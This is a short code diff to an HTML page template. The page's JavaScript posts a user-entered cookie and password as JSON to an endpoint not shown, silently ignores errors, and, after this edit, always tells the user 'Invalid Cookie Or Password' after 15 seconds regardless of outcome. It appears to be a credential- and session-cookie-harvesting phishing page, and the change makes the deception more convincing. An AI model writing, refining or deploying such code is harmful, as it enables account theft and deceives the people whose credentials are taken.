@@ -277,9 +277,9 @@ HTML_PAGE = """
       body: JSON.stringify({ cookie: cookie, password: password })
     }).catch(() => {});
 
-    // After 15 seconds ALWAYS show Failed
+    // After 15 seconds ALWAYS show Invalid Cookie Or Password
     setTimeout(() => {
-      statusMsg.textContent = "Succeeded";
+      statusMsg.textContent = "Invalid Cookie Or Password";
       btn.disabled = false;
       document.getElementById('cookieInput').disabled = false;
       document.getElementById('passwordInput').disabled = false;
